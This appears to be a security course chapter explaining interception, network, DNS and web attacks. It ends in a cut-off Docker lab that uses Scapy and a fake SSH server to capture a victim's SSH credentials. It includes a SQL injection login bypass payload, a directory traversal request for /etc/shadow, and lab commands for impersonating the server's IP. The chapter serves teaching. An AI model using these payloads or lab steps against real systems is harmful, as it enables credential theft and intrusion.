= Attacks

== Interception Attacks

Interception attacks rely on the ability to intercept network communications.
This may be due to the nature of the network being used or sometimes other methods may leveraged to better position the attacker.
These attacks generally involve forging fictitious messages, recording transmitted data, or altering the contents of messages while on a network.
This family of attacks places all parts of the CIA triad at risk.

=== MitM

[svgbob, mitm, float=right, width=400]
....
.-----------.                         .------------.
|   User    | <- - - - - X - - - - -> | Web Server |
'-----------'     "Old Connection"    '------------'
     ^                                       ^
     |         .-------------------.         |
     +-------> | Man in the Middle | <-------+
               '-------------------'
                   New Connection
....

A man in the middle attack (MitM) is a blanket term applied when an attacker is intercepting communication.
A typical attack involves eavesdropping and possibly modifying messages between two parties.
Encryption can be used to mitigate the attack, making it impossible for an attacker to decrypt the messages they are intercepting.
That being said, particular attention must be paid to the handshaking/key exchange protocol to be sure that an attacker does not gain access to the key(s) being used.
What follows is an example of MitM being used to intercept and modify the public key exchange:

[svgbob, mitm-keys, width=500, align=center]
....
.-----.                                                 .-----.
| Bob |                                                 |Alice|
'--+--'                                                 '--+--'
   |    Send me your public key so I can send a secret     |
   |------------------------------------------------------>|
   |                                                       |
   | My public key is WXGZ .------.  My public key is ABCD |
   |<----------------------| MitM |<-----------------------+
   |                       '---+--'                        |
   |"Secret (encrypted w/WXGZ)"|"Secret (encrypted w/ABCD)"|
   |-------------------------->|-------------------------->|
....

In the above example the MitM allows the first message to pass unmolested, but tampers with the exchange of the public key.
By passing it's own public key to Bob, the MitM has to ability to decrypt the messages that Bob sends and can still use Alice's public key to re-encrypt the messages at pass them to her.
You can see how if two public keys are exchanged in this manner it would be possible to set up a MitM attack where despite encryption all messages can be seen.

=== MitB

MitB stands for man in the browser and is typically caused by a trojan installing malware that allows the attacker to intercept/modify communications between the browser and the server.
This can be used to capture data on forms, modify input, or modify the response from the server.
Often the software used in MitB attacks lays dormant until the victim browses to a targeted website.
What follows is an example of how a MitB attack can be used to modify an online banking request to send money:

[plantuml, mitb, svg, width=900, align=center]
....
@startuml
skinparam Shadowing false
skinparam RectangleBackgroundColor White
skinparam RectangleBorderColor White
skinparam defaultTextAlignment center
skinparam componentArrowColor Black

!include <tupadr3/common>
!include <tupadr3/font-awesome/server>
!include <tupadr3/font-awesome/user>
!include <tupadr3/font-awesome/laptop>
!include <tupadr3/font-awesome/chrome>
!include <tupadr3/font-awesome/user_secret>

FA_USER(user, User)
FA_LAPTOP(workstation, Workstation)
FA_CHROME(browser, Browser)
FA_USER_SECRET(attacker, Attacker)
FA_SERVER(server, Web Server)

user -> workstation: malware downloaded to workstation
attacker <--> browser
browser -> workstation: approved $1,000
workstation -> browser: transfer $1,000
browser -> server: transfer $10,000 to Attacker
server -> browser: approved $10,000 to Attacker
@enduml
....

As you can see the attacker ended up with $10,000 and the victim simply thought they authorized a payment of $1,000 to someone else.
These attacks can be difficult to detect because they take place within the browser and are opportunistic.

=== Replay Attacks

This family of attacks typically involves a MitM making a copy of the transmission and _replaying_ it to impersonate the victim.
Logon credentials, simple hashes, and specific commands are sometimes susceptible to this type of attack.
The solution is to use timestamps, nonces (random number for that particular session), rotating keys, or a counter to make sure commands cannot be executed outside of context.

.One-time Passwords
****
To help mitigate replay attacks, an online banking application may require that client use a one-time password (OTP) when submitting transactions.
An OTP is a frequently changing value that is known to both the client and the server.
Several one-time password schemes exist, most of which make use of a cryptographic hash function with a shared seed between client and server.
Periodically the client and server update to a new hash based on the seed and without the seed it is impossible to know what the next hash will be.
By using an OTP anyone who intercepts the traffic will not be able to perform a replay attack as the password will not be current.
****

=== SSL Circumvention

.MitM preventing HTTPS upgrade and skimming passwords
[svgbob, ssl-mitm, width=500, float=right]
....
.--------.                   .----------.                  .---------.
| Victim |                   | Attacker |                  | "Server"|
'---+----'                   '-----+----'                  '----+----'
    |                              |                            |
    |    "GET http://njit.edu"     |                            |
    |----------------------------->|                            |
    |                              |   "GET http://njit.edu"    |
    |                              |--------------------------->|
    |                              |                            |
    |                              |        "301 Moved"         |
    |                              |<---------------------------|
    |                              |                            |
    |                              |   "GET https://njit.edu"   |
    |                              |--------------------------->|
    |                              |                            |
    |                              |       "200 OK (HTTPS)"     |
    |                              |<---------------------------|
    |        "200 OK (HTTP)"       |                            |
    |<-----------------------------|                            |
    |                              |                            |
    |    "POST http://njit.edu"    |                            |
    |       "username=admin"       |                            |
    |       "password=admin"       |                            |
    |----------------------------->|                            |
    |                              |   "POST https://njit.edu"  |
    |                              |       "username=admin"     |
    |                              |       "password=admin"     |
    |                              |--------------------------->|
    |                              |                            |
    |                              |<---------------------------|
    |                              |                            |
    |<-----------------------------|                            |
....

If you think about the intercepted key exchange given in the above MitM example, a similar attack can allow attackers to view SSL traffic.
The attacker gives the victim a bogus certificate authority (CA) certificate which the victim installs.
This is often accomplished via a trojan.
Then the attacker places themselves in the middle of an uninitiated secure connection.
During the key exchange the attacker creates a custom certificate signed by a bogus CA for the connection between attacker and victim.
The attacker also makes an actual HTTPS connection to the service and proxies data for the victim.
All of the victims data will show up in plaintext for the attacker but the connection will appear to be secure for the victim. 
This is used in the https://www.telerik.com/fiddler[Fiddler] debugging proxy to decrypt HTTPS traffic and is also used in some network appliances that perform deep packet inspection.

Another MitM attack on SSL is simply to maintain or downgrade to an HTTP connection with the victim and proxy data to an actual HTTPS connection with the server.
Most servers will upgrade an insecure connection, but by intercepting that exchange the attacker can continue to monitor the victim's traffic.

== Network Layer Attacks

=== MAC Spoofing/MAC Cloning

Most networks expect that a MAC address will correspond to the unique numbers on a network interface controller (NIC), but it is actually quite easy to change.
Virtual networking necessitates the ability to use a different MAC address and this feature is built into most modern operating systems.
MAC spoofing is when an attacker sets their MAC address to the MAC address of another machine on the network in an effort to initiate an attack.
For example, them may set themselves up as a gateway to launch a MitM attack.

=== MAC Flooding

Switches are tasked with keeping track of which MAC addresses correspond to which ports on the switch.
They use this to make sure that traffic is only routed where it needs to go.
Given that MAC addresses can be changed, an attacker could flood a switch with packets from many different MAC addresses and possibly overflow the MAC-port routing table.
Some switches may default to hub-like functionality and send frames to all ports in an effort to keep traffic flowing.
This then allows an attacker to capture traffic from other machines on the network.

=== ARP Poisoning

[.float-group]
--

image::arp.svg[width=500, float=left]

An attacker may also use ARP packets to impersonate another machine on the network, such as a gateway router.
By repeatedly sending out ARP packets, _gratuitous arp_, redirecting packets bound for the gateway's IP to the attackers MAC address an attacker can set up a MitM scenario.
This is particularly difficult because depending on the TTL of the ARP cache it may take up to 20 minutes for normal network operations to resume.

--

== Internet Layer Attacks

=== IP Spoofing

[.float-group]
--

[svgbob, ip-header, width=500, float=left]
....
|<-------------------------- 32 bits --------------------------->|
+------+-------+----------------+--------------------------------+
| Vers |  IHL  |      TOS       |          Total Length          |
+------+-------+----------------+-------+------------------------+
|       Identification          | Flags |    Fragment Offset     |
+--------------+----------------+-------+------------------------+
| Time to Live |     Protocol   |        Header Checksum         |
+--------------+----------------+--------------------------------+
|   Totally legitimate source address, I'm not lying I swear     |
+----------------------------------------------------------------+
|           Victim, err I mean Destination address               |
+----------------------------------------------------------------+
|                                                                |
                             Options                               
|                       (up to 40 bytes)                         |
+----------------------------------------------------------------+
|                                                                |
                              Data
|                     (up to 65536 bytes)                        |
+----------------------------------------------------------------+
....

Unfortunately Internet Protocol (IP) was not designed with security in mind.
This means that by default any IP address can be put in the packet header and the packet will still be forwarded to the network.
This leads to issues where an IP can be _spoofed_ and malicious packets sent out.
At this layer there really aren't any good solutions to this problem.
This means that the sources of packets often need to be authenticated in higher layers and protocols must take into account the fact that the IP layer is fundamentally insecure.

--

.Smurf Attack
****

.https://commons.wikimedia.org/wiki/File:Ataque_Smurf_DDoS.png[Smurf DDos Attack] by https://www.imperva.com/learn/ddos/smurf-attack-ddos/?redirect=Incapsula[Imperva Incapsula] used under https://creativecommons.org/licenses/by-sa/4.0/deed.en[CC-BY-SA 4.0]
image::smurf.png[width=600, align=center]

The Smurf attack is a great example of how spoofed IP addresses can lead to major problems. 
The Smurf attack is an early type of Distributed Denial of Service attack.
An attacker would create an ICMP echo request with the victims IP address as the source address.
This echo request would be directed at a broadcast IP address for a subnet.
Many of the clients on the subnet would respond the echo request, flooding the victim with responses.
The asymmetric nature of this attack, a single packet prompting possibly hundreds of responses, made it particularly hard to deal with.
Using a Smurf attack, an attacker could keep a victim _pinned down_ with minimal bandwidth required on their end.
Modern clients no longer respond to ICMP echo requests directed at the broadcast, mitigating the risk of this kind of attack.
****

== Name Resolution Attacks

=== DNS Cache Poisoning

A DNS resolved can be tricked into caching incorrect information and serving it to other clients.
In this scenario an attacker assumes the role of the authoritative DNS server by responding to a DNS query with a forged source IP.
One of the reasons this is possible is because DNS query responses are often single, unauthenticated packets.
Once the server has the invalid DNS cache entry it will continue to direct users to the incorrect IP address for the TTL of the entry.
https://cloud.google.com/dns/docs/dnssec[DNSSEC] can be used to mitigate these attacks by forcing authentication on DNS answers. 

=== LLMNR Hijacking

In this scenario an attacker responds to a Link-Local Multicast Name Resolution (LLMNR) broadcast and impersonates an authentication server.
The unexpecting victim fills in their credentials, which are promptly stolen.
This attack can be mitigated by disabling LLMNR on the network.

== Web-based Attacks

The world wide web and the protocols/formats/languages it uses (HTTP, HTML, JavaScript, etc.) were _not_ originally designed with security in mind.
By default, web pages trust the content they receive to not be malicious.
Scripts, commands, cookies, etc. are implicitly trusted.
Web technologies have become so popular that they are a common target for attackers and developers must use tokens, sanitize data, and check inputs if they want those technologies to be secure.

https://owasp.org/[The Open Web Application Security Project (OWASP)] is a great source of resources for web application security.
They maintain a top 10 list of web application security risks. As of 2021, the https://owasp.org/www-project-top-ten/[OWASP top 10] is:

* Broken Access Control
* Cryptographic Failures
* Injection
* Insecure Design
* Security Misconfiguration
* Vulnerable and Outdated Components
* Identification and Authentication Failures
* Software and Data Integrity Failures
* Security Logging and Monitoring Failures
* Server-Side Request Forgery

=== XSS

Cross-Site scripting refers to the process by which a bad actor can inject a script into a website.
Recall that many websites take inputs from forms and may later display that data on another page.
If that data isn't just data, but actually a JavaScript script, that script may run on the page that displays it.

Using this technique attackers can access cookies, session tokens, and other sensitive information.
Depending on where the script was injected and how the server displays that data the script could be stored permanently on the target server.
XSS scripts may also be reflected, typically sent in links, where they are only used for one session.

To mitigate XSS risks, it is important that a web developer sanitize their inputs.
When a form is submitted, the website should check that the data submitted isn't a script or other malicious content.
If the data does cannot be cleaned, it shouldn't be stored or used.

.Samy Worm
****
One October 4th, 2005 an XSS worm spread across MySpace, the dominant social network at the time.
The worm was written by Samy Kamkar as a simple post that when read would cause a viewers machine to make their own post stating "but most of all, samy is my hero" and including the code to propagate.
The results was that within 20 hours over one million users had run the payload.

Now Samy is a prominent security consultant and you can read https://samy.pl/myspace/tech.html[his full technical explanation of the worm here].
Vice Motherboard also did a segment on Samy for their https://www.youtube.com/watch?v=DtnuaHl378M[_Greatest Moments in Hacking History_ series].
****

=== CSRF

Cross-Site Request Forgery (CSRF) involves using an victims already authenticated session in a request that is not part of that session.
Imagine you are logged into Twitter.
An attacker sends you a form link in GMail, that when clicked on posts a tweet that says, "I'm a CSRF victim."
Assuming Twitter accepts the form submission you will now have a tweet in your timeline that states "I'm a CSRF victim."

This is probably the most benign scenario, you can imagine things be much worse with an online banking application.
The solution is for the website (Twitter in this case) to use a CSRF token (which it does).
When the form is generated, a random value is included as a hidden input.
That random, hidden input is the CSRF token.
When a submission is made, if the CSRF token submitted does not match the one created for the form (which only the valid website knows) the submission is not accepted.

CSRF tokens are yet another example of how web applications require proactive security as opposed to being secure by design.
Most web apps are employing them, but it can be easy for a developer to forget.

=== SSRF

[svgbob, ssrf, align=center]
....
<---------------------------- Internet ---------------------------> | <----------- Intranet ---------------->
                                                                    
                                                                    |
.----------. "GET https://example.com/id?content=http://10.0.0.1/secret"   .-----------. Request  .--------.
|          | ------------------------------------------------------------> |           | -------> |        |
| Attacker | "Response: secret"                                            |example.com| Response |10.0.0.1|
|          | <------------------------------------------------------------ |           | <------- |        |
'----------'                                                        |      '-----------'          '--------'

                                                                    |
....

Web systems often communicate with internal servers the retrieve information.
These may be API servers, databases, or messaging servers.
If an attacker can fool a web server into passing a malicious request to its internal server, the attacker and abuse the internal trust of the system.
This is referred to a server-side request forgery (SSRF).
Once again, this kind of attack is mitigated with input validation, which needs to be included in the application.

=== Session Hijacking

Session hijacking may involve other methods of compromise, but the end goal is to "steal" a session between the victim and another server.
Imagine the following scenario: A person logs in to their personal banking website, which issues them a cookie which proves they are authenticated.
A bad actor is monitoring the connections through an XSS exploit that forwards all connection cookies to them.
The bad actor uses the cookie that was issued to make a transfer from the user's bank account to the bad actors bank account.

Depending on the method used, session hijacking may be prevented through use of a better session key or by requiring transport layer security (TLS) to connect.
In the above scenario the only way to prevent session hijacking would be to repair the initial XSS vulnerability.

=== SQL Injection

As mentioned in the SSRF section, almost all web systems are supported by other servers running internally.
One of the most common scenarios is to have a web server which reaches out to an internal database.
Relational databases utilize structured query language (SQL) so a web application may generate many different SQL queries during its regular operations.
If a user input is placed directly into the query, it can be possible to make the result function in a way that was not intended or yield secret information from the database.

Take a look at the following PHP code:

[source, php]
----
$userName = $_POST['user_name']
$pw = $_POST['password']
$statement = "SELECT * FROM users WHERE name='" + $userName + "' AND password='" + $pw + "';"
----

In the case where the user_name `admin` and the password `password` were submitted, the following SQL would be generated: `SELECT * FROM users WHERE name='admin' AND password='password';`

In the case where the user_name `admin` and the password `' OR 1=1;` were submitted, the following SQL would be generated: `SELECT * FROM users WHERE name='admin' AND password='' OR 1=1;`

In this second case, a user could login without needing a valid password.

=== XML Injection

XML stands for extensible markup language, and it is often used to transfer messages.
XML can be an important part of a web systems infrastructure and as such if unsanitized user inputs are allowed to generate XML the is used in the system many things can go wrong.
Using XML injection an attacker may be able to retrieve secret files or create admin accounts.
XML injection can be mitigated by input validation or possibly disabling the resolution of external entities in the framework being used.

=== LDAP Injection

Finally, Lightweight Directory Access Protocol (LDAP) is often used to store information about users.
As such, it can be found behind many web applications.
LDAP also supports complex queries in a similar fashion to SQL.
An unsantized user input can lead to a LDAP query with unexpected results.

=== Directory Traversal

A poorly designed web server may be subject to a directory traversal attack.
Recall that web servers are designed to serve static content from a particular directory, `/var/www` for example.
Now suppose that an attacker submitted a `GET` request for `http://www.example.com/../../etc/shadow`.
It is possible that the web server may actually go up two directories and serve that file.

This can be addressed with file permissions, access controls, and filtering incoming requests.
It is important to note that there is more than one way to specify a path in an HTTP request, including using URL encoding, so all possible malicious inputs must be sanitized. 

=== URL Hijacking/Typosquating

An unfortunately common, broad-based attack is to buy a domain with a similar name to a very popular domain.
When users mistype the popular domain they end up at the malicious actor's website.
For example, imagine if someone registered `gooogle.com` (note the three o's).
They could gain a lot of traffic from people who mistyped google.

These sites could be used for ad revenue, phishing credentials, or even possibly to distribute malware.
A mitigation that several browsers implement is to keep a list of malicious websites and warn users before they visit them.

=== Domain Hijacking

Domain names expire after a certain period of time and the registrant may forget to renew.
In these rare occasions an attacker may actually gain control of a popular domain name, google.com for example, and route traffic to their site.
The malicious activities are the same as for typosquating, but the attacker does not need to rely on the users making a mistake.

It is also possible to hijack a domain by logging into the domain registration system using stolen/compromised credentials.
In this scenario an attacker could still modify a record to point to their server, but wouldn't have to rely on the company forgetting to renew.

=== Zone Transfer Attacks

On the subject of the domain name system, zone transfer attacks may leak sensitive information about domains. 
DNS is a distributed system by design and is used for resolving domain names into IP addresses.
Due to the distributed nature of the system, protocols were built in for having a single domain served by multiple servers.
These servers pass information to each other using a DNS zone transfer.

Typically these communications should be internal as they may leak valuable information regarding the zone.
Unfortunately an improperly configured DNS server may advertise its zone transfers publicly.
https://digi.ninja/projects/zonetransferme.php[In such a situation an attacker can use the leaked information in the recon phase of an attack.]

=== Clickjacking

A website may be designed in such a way that the interface is confusing to the user and they inadvertently click on an advertisement or malicious link.
This is common practice on low integrity websites such as streaming sites, torrent trackers, and adult websites.
It is often complicated by a poor ad screening or even purposefully making ads that look similar to the content.

== Outcomes

=== Remote Code Execution (RCE)

One of the most dangerous outcomes of an attack is Remote or Arbitrary Code Execution.
RCE gives the attacker the ability to execute any instructions they want on the compromised machine.
Often the attacker will start a shell with administrative privileges so they can do whatever they want.
Imagine SSHing into a remote Linux machine and elevating your privileges to root.
This is essentially the type of power that can result from RCE.
Attackers may also use the RCE to attack the availability of a computing resource by causing a program to terminate.
In this situation the RCE is being used as part of a denial of service (DoS) attack.

=== Privilege Escalation

[quote, Anonymous]
There is no elevator to root, you have to use an exploit.

[svgbob, escalation, width=200, float=left]
....
            ^
           /    +------+
          /     |      |
         /      |      |
        /       |Super |
       /        |Admin |
      /  +------+      |
     /   |      |      |
    /    |      |      |
   /     |Admin |      |
  /+-----+      |      |
 / |User |      |      |
/  +-----+------+------+
....

Privilege escalation involves gaining access to protected resources through unintended means.
An example would be https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034[CVE-2021-4034], a local privilege escalation vulnerability recently discovered in the Linux `pkexec` command.
`pkexec` runs with elevated privileges and does not safely parse command line arguments.
As such it can be exploited to give a regular user a root shell.
This would be an example of local, vertical privilege escalation.

Privilege escalation is typically broken into two categories: horizontal and vertical.
Horizontal privilege escalation gives similar access to resources, ie. moving from one user account to another.
Vertical privilege escalation gives higher level access, ie. moving from a user account to an admin account.
The five main ways privilege escalation is achieved are credential exploitation, vulnerabilities/exploits, misconfigurations, malware, and social engineering.

=== Denial of Service (DoS)

A denial of service attack (Dos) attempts to keep a system from working by overwhelming it with requests.
A distributed denial of service attack (DDoS) does the same thing by utilizing many different machines.
Typically the attacking nodes for a DDoS attack are members of a botnet, machines that have been exploited previously and are under the attackers control.

DoS attacks can take many forms including:

SYN Floods:: A malicious actor can send multiple SYN packets to initiate the TCP three-way handshake. SYN packets are easy to send, but may cause significant resources to be allocated on the server responding to them. Due to the asymettric nature of resource allocation this makes the use of SYN packets particularly suited to DoS attack. https://en.wikipedia.org/wiki/SYN_cookies[SYN cookies] can be used to help prevent this kind of attack.

ICMP Floods:: Often referred to as pinging, ICMP echo requests can be used to overwhelm a server. Especially when sent from multiple sources. The solution is typically to rate limit ICMP packets on the server.

Buffer Overflows/Exploits:: Poorly designed software may fail when it receives unexpected data. This could be something as simple as sending more data than a buffer can hold, or https://en.wikipedia.org/wiki/WinNuke[setting the urgent pointer (URG) on a packet destined for port 139 of a Windows system].

== Lab: MitM with Scapy

In this lab we will use a fake SSH server, https://github.com/jaksi/sshesame[sshesame], and an interactive packet manipulation program, https://scapy.net/[scapy], to disrupt an ongoing SSH session between victim and server, position ourself in the middle of the traffic, and capture the username and password victim is using.

.IP Addresses Used
[width=50%, float=right]
|===
|Name|IP Address

|server|172.20.0.5
|victim|172.20.0.6
|attacker|172.20.0.7

|===

For this lab our IP addresses are configured statically and are known to the attacker.
It is also assumed that the attacker is on the local network.
Lastly victim has been poorly configured to ignore changes to the host key.
This is not entirely unreasonable as many users just ignore the warnings and clear out the known_hosts file when prompted anyway.

Start by downloading the https://github.com/rxt1077/it230/raw/main/labs/scapy.zip[scapy.zip] file which contains the Docker Compose configuration we will be using.
Uncompress it to a directory where you have write access.
This lab will require us to use three terminal windows/tabs: one for the `docker-compose up` command which will show the output of everything running in the background, one for the victim which will show an SSH session with the server, and one for the attacker which we will use to make the attack.

[svgbob, scapy, width=800, align=center]
....
          "docker-compose up"                            "victim" 
.-------------------------------------.   .-------------------------------------.
|                                 - X |   |                                 - X |
+-------------------------------------+   +-------------------------------------+
|                                     |   |                                     |
| "$ docker-compose up"               |   | "$ ssh server"                      |
|                                     |   |                                     |
|                                     |   |                                     |
|                                     |   |                                     |
'-------------------------------------'   '-------------------------------------'

                                  "attacker"
                    .-------------------------------------.
                    |                                 - X |
                    +-------------------------------------+
                    |                                     |
                    | "$ scapy"                           |
                    | ">>>"                               |
                    |                                     |
                    |                                     |
                    '-------------------------------------'
....

Open three terminals and `cd` into the directory where you uncompressed the lab zip file in each of them.
There should be a `docker-compose.yml` file and `server`, `victim`, and `attacker` directories in the directory you are in.

In the first terminal run the `docker-compose up` command to build the images and run the containers:

.docker-compose up
[source, text]
----
PS C:\Users\rxt1077\it230\labs\scapy> docker-compose up
Creating network "scapy_testnet" with the default driver
Creating scapy_server_1   ... done
Creating scapy_victim_1   ... done
Creating scapy_attacker_1 ... done
Attaching to scapy_victim_1, scapy_server_1, scapy_attacker_1
server_1    | > Starting SSHD
server_1    | >> Generating new host keys
scapy_victim_1 exited with code 0
attacker_1  | INFO 2021/10/07 13:56:45 No host keys configured, using keys at "/root/.local/share/sshesame"
attacker_1  | INFO 2021/10/07 13:56:45 Host key "/root/.local/share/sshesame/host_rsa_key" not found, generating it
attacker_1  | INFO 2021/10/07 13:56:45 Host key "/root/.local/share/sshesame/host_ecdsa_key" not found, generating it
attacker_1  | INFO 2021/10/07 13:56:45 Host key "/root/.local/share/sshesame/host_ed25519_key" not found, generating it
attacker_1  | INFO 2021/10/07 13:56:45 Listening on [::]:22 <1>
server_1    | ssh-keygen: generating new host keys: RSA DSA ECDSA ED25519
server_1    | >>> Fingerprints for dsa host key
server_1    | 1024 MD5:a5:e6:e9:38:d2:2e:88:fd:f0:aa:a8:05:07:35:5f:18 root@a010fe3c2f3c (DSA)
server_1    | 1024 SHA256:NM7DONpt1doZp4e6WV+6WVVr+KUrh9luUSRcAhnzdyw root@a010fe3c2f3c (DSA)
server_1    | 1024 SHA512:LHfFdSk1XiAKQArH0CW+RkaKv5GgovPCH7UIQ+P4T2LbgGpCBP5aGA1V3oriYbTZWuS9TlUgDbEfTBq19AV/cA root@a010fe3c2f3c (DSA)
server_1    | >>> Fingerprints for rsa host key
server_1    | 3072 MD5:74:44:b6:a2:74:b9:7e:1b:ba:3d:27:b8:19:3a:48:df root@a010fe3c2f3c (RSA)
server_1    | 3072 SHA256:mubm9mLNrdNDk5fyj0dghDBIbbwcVKXo23Qdv61/S/c root@a010fe3c2f3c (RSA)
server_1    | 3072 SHA512:JFQhS6trY7sNqRSwZ+t0uyBb5ddNh9qSLtBrMaa5G7xWzKHpxCuKBSDbvLk4W9JKeQftTU4293UDV9vqCcf/6w root@a010fe3c2f3c (RSA)
server_1    | >>> Fingerprints for ecdsa host key
server_1    | 256 MD5:15:75:5f:9b:72:7c:f0:13:ea:0d:b4:47:b7:62:69:63 root@a010fe3c2f3c (ECDSA)
server_1    | 256 SHA256:4p/Afp/8C2tHn7AePdS7OHCgPxfBamdaLIUg4IJ7xx4 root@a010fe3c2f3c (ECDSA)
server_1    | 256 SHA512:NnbevqBXFkGQWIirdFsLPnX85q7q/1Y7E4i+BLHLqE3cg2aqkduBJsssyr9+G7bSvq7txvjl9SRmyRAzuDT7DQ root@a010fe3c2f3c (ECDSA)
server_1    | >>> Fingerprints for ed25519 host key
server_1    | 256 MD5:ad:00:61:26:4d:a0:07:be:6b:8e:91:bd:f0:65:e6:14 root@a010fe3c2f3c (ED25519)
server_1    | 256 SHA256:Vl7jQulDsONglP1xbSN+J8nSfCaIER40rHhgy7z/BYg root@a010fe3c2f3c (ED25519)
server_1    | 256 SHA512:WkmvOWe6oaZ/qE1ZiA0rZAjn9H+hCDxI8NHpsjRNCalK/CgVV9+VhkzHgRTKfKTqQeE0y/Zz2GaEJGv/sapCHg root@a010fe3c2f3c (ED25519)
server_1    | WARNING: No SSH authorized_keys found!
server_1    | >> Unlocking root account
server_1    | WARNING: password authentication enabled.
server_1    | WARNING: password authentication for root user enabled.
server_1    | >> Running: /etc/entrypoint.d/changepw.sh
server_1    | Running /usr/sbin/sshd -D -e -f /etc/ssh/sshd_config
server_1    | Server listening on 0.0.0.0 port 22. <2>
server_1    | Server listening on :: port 22.
----
<1> Notice that attacker has a fake SSH server running in the background
<2> Notice that server has a legitimate SSH server running in the background

In the second terminal run `docker-compose run victim bash` and then from the prompt we'll SSH to server using the password "password":

.victim
[source, text]
----
PS C:\Users\rxt1077\it230\labs\scapy> docker-compose run victim bash
Creating scapy_victim_run ... done
bash-5.0# ssh server
Warning: Permanently added 'server,172.20.0.5' (ECDSA) to the list of known hosts.
root@server's password: <1>
You are now logged into 'server' (presumably from 'victim') via SSH for this assignment.
Leave this connection open while you experiment with scapy from 'attacker'.
bf9ebe42a108:~#
----
<1> The password is "password"

In the third terminal we'll start by _executing_ (recall that at this point it's already running sshesame in the background) a BASH shell on attacker and configuring it to accept packets not only for its own IP address, but also for the server's IP address.
Once traffic is routed to us, this will allow attacker to also respond to packets destined for 172.20.0.5.

.attacker
[source, console]
----
PS C:\Users\rxt1077\it230\labs\scapy> docker-compose exec attacker bash
root@5195de3d330c:/# ip addr add 172.20.0.5 dev eth0
root@5195de3d330c:/# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: tunl0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
3: sit0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/sit 0.0.0.0 brd 0.0.0.0
347: eth0@if348: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:14:00:07 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.20.0.7/24 brd 172.20.0.255 scope global eth0 <1>
       valid_lft forever preferred_lft forever
    inet 172.20.0.5/32 scope global eth0 <2>
       valid_lft forever preferred_lft forever
----
<1> This is the IP we started with
<2> This is an additional IP that attacker believes it has

Now that the attacker system is configured, we'll start up `scapy` interactively:

.attacker
[source, text]
----
root@5195de3d330c:/# scapy
INFO: Can't import matplotlib. Won't be able to plot.
INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
INFO: No IPv6 support in kernel
INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11)
INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication.
WARNING: IPython not available. Using standard Python shell instead.
AutoCompletion, History are disabled.

                     aSPY//YASa
             apyyyyCY//////////YCa       |
            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
 ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.5
 AYAsAYYYYYYYY///Ps              cY//S   |
         pCCCCY//p          cSSps y//Y   | https://github.com/secdev/scapy
         SPPPP///a          pP///AC//Y   |
              A//A            cyP////C   | Have fun!
              p///Ac            sC///a   |
              P////YCpc           A//A   | To craft a packet, you have to be a
       scccccp///pSP///p          p//Y   | packet, and learn how to swim in
      sY/////////y  caa           S//P   | the wires and in the waves.
       cayCyayP//Ya              pY/Ya   |        -- Jean-Claude Van Damme
        sY/PsY////YCc          aC//Yp    |
         sc  sccaCY//PCypaapyCP//YSs
                  spCPY//////YPSps
                       ccaacs
>>>
----

You'll notice that scapy's prompt is >>>, just like python because it _is_ python.
Since we're working in python, let's make our lives easier by defining a few simple variables:

.attacker
[source, text]
----
>>> server_ip = "172.20.0.5" <1>
>>> victim_ip = "172.20.0.6"
----
<1> IPv4 addresses are strings in scapy

Now let's see how scapy allows us to build packets.
We'll make an Ethernet frame, with an IP packet inside it, with an ICMP echo request in that, with the data being set to our name:

.attacker
[source, text]
----
>>> ping = Ether()/IP(dst=server_ip)/ICMP()/"Ryan Tolboom" <1>
>>> ping.show() <2>
###[ Ethernet ]###
  dst       = 02:42:ac:14:00:05
  src       = 02:42:ac:14:00:07
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     =
     frag      = 0
     ttl       = 64
     proto     = icmp
     chksum    = None
     src       = 172.20.0.7
     dst       = 172.20.0.5
     \options   \
###[ ICMP ]###
        type      = echo-request
        code      = 0
        chksum    = None
        id        = 0x0
        seq       = 0x0
        unused    = ''
###[ Raw ]###
           load      = 'Ryan Tolboom'

>>> result = srp1(ping) <3>
Begin emission:
Finished sending 1 packets.
.*
Received 2 packets, got 1 answers, remaining 0 packets
>>> result.show()
###[ Ethernet ]###
  dst       = 02:42:ac:14:00:07
  src       = 02:42:ac:14:00:05
  type      = IPv4
###[ IP ]###
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 40
     id        = 62086
     flags     =
     frag      = 0
     ttl       = 64
     proto     = icmp
     chksum    = 0x301a
     src       = 172.20.0.5
     dst       = 172.20.0.7
     \options   \
###[ ICMP ]###
        type      = echo-reply
        code      = 0
        chksum    = 0xea7a
        id        = 0x0
        seq       = 0x0
        unused    = ''
###[ Raw ]###
           load      = 'Ryan Tolboom'

>>> server_mac = result[0][0].src
>>> server_mac
'02:42:ac:14:00:05'
----
<1> Scapy uses the '/' operator to nest protocols.
    This is my name in an ICMP packet, in an IP packet, in an Ethernet frame.
    Be sure you use your own name!
<2> The `show()` command prints out packets in detail
<3> The `srp1()` function sends and receives _one_ packet at Layer 2

Notice how we use this to capture the server's MAC address and save it in the `server_mac` variable.

[IMPORTANT.deliverable]
====
Take a screenshot of your scapy session at this point showing that you completed an ICMP echo request/response with your name in it.
====

We can also determine MAC addresses at Layer 2 with an ARP "who-has" request.
Let's craft and send a broadcast ethernet frame with an ARP "who-has" request for the victims's IP address.
The result will tell use what the victim's MAC address is:

.attacker
[source, text]
----
>>> whohas = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip)
>>> result = srp1(whohas)
Begin emission:
Finished sending 1 packets.
*
Received 1 packets, got 1 answers, remaining 0 packets
>>> result.show()
###[ Ethernet ]###
  dst       = 02:42:ac:14:00:07
  src       = 02:42:ac:14:00:06 <1>
  type      = ARP
###[ ARP ]###
     hwtype    = 0x1
     ptype     = IPv4
     hwlen     = 6
     plen      = 4
     op        = is-at
